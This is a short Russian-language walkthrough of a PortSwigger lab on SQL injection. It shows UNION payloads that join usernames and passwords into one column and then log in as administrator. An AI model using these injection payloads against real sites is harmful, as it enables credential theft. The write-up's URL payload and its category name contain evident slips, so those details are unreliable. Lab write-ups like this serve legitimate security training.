# SQL injection UNION attack, retrieving multiple values in a single column

## Theory

<h3>Получение нескольких значений в одном столбце</h3>

Можно получить несколько значений вместе в этом одном столбце, объединив значения вместе, включив подходящий разделитель, чтобы мы могли различать объединенные значения.

Например, в Oracle можно отправить ввод:
```
' UNION SELECT username || '~' || password FROM users--
```

Знак "**||**" является знаком конкатенации в Oracle. Внедренный запрос объединяет значения полей имени пользователя и пароля, разделенные символом "**~**".

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_UNION_attack_retrieving_multiple_values_in_a_single_column/assets/1.png)

Выбираем пункт Lifestyle. Определяем количество стобцов и какой тип данных они принимают. Вытаскиваем имена пользователей и пароли и таблицы в удобной формате.
```
/filter?category=AccessoriesUNION+SELECT+NULL,username+||"~"||+password+FROM+users--
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_UNION_attack_retrieving_multiple_values_in_a_single_column/assets/2.png)

Отправляем запрос и логинимся под адмнистратора.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/SQL_injection_UNION_attack_retrieving_multiple_values_in_a_single_column/assets/3.png)
